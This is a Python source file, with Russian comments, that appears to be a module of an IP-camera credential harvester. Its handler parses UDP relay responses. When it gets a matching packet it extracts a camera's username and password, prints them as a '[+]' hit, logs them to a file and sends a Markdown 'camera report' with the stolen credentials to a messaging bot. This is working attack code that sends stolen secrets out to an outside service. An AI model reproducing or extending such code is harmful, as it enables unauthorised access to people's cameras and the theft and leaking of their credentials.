from app.tools import ToolsClass


class DataHandler:
    def __init__(self, camera_id, relay_queue=None, bot=None):
        self.camera_id = camera_id
        self.relay_queue = relay_queue
        self.bot = bot

    async def handle_data(self, data, protocol):
        """
        Обрабатывает данные, полученные от сервера.

        Parameters:
        - data (bytes): Полученные данные.
        - protocol (UDPClientProtocol): Инстанс протокола для управления соединением.

        """
        try:
            if data and data[6:7] != b'\x00':
                parsed_data = ToolsClass.parse_relay_server(data)
                if parsed_data:
                    protocol.active = False
                    protocol.transport.close()
                    await self.relay_queue.put(parsed_data)
            elif data and data[0] == 0xa7:
                # Извлечение и обработка учетных данных
                username = self.extract_string(data, 8)
                password = self.extract_string(data, 0x3a)
                print(f'\u001b[33m[+] ID: {self.camera_id} User: {username} Password: {password}\u001b[37m')

                credentials = {
                    'id': self.camera_id,
                    'username': username,
                    'password': password,
                }

                if username:  # проверка, что username не пустой
                    if self.bot:
                        # Отправляем текст с разметкой Markdown
                        camera_emoji = "\U0001F4F7"  # 📷
                        user_emoji = "\U0001F464"  # 👤
                        lock_emoji = "\U0001F512"  # 🔒

                        message = f"*Отчет о камере* {camera_emoji}\n" \
                                  f"*Идентификатор камеры*: `{self.camera_id}`\n" \
                                  f"*Пользователь* {user_emoji}: `{username}`\n" \
                                  f"*Пароль* {lock_emoji}: `{password}`"
                        # Запись в файл
                        with open('data_log.txt', 'a') as file:
                            file.write(message)
                        self.bot.send_message(message)
                    protocol.active = False
                    protocol.transport.close()
                    await self.relay_queue.put(credentials)
                await self.relay_queue.put(None)
            else:
                await self.relay_queue.put(None)
        except Exception as e:
            print("[ERROR] Exception in handle_data:", str(e))
            await self.relay_queue.put(e)

    @staticmethod
    def extract_string(data, start_index):
        """
        Извлекает строку из данных, начиная с заданного индекса, и декодирует ее из UTF-8.
        """
        end_index = data.find(b'\x00', start_index)
        return data[start_index:end_index].decode('utf-8').strip()
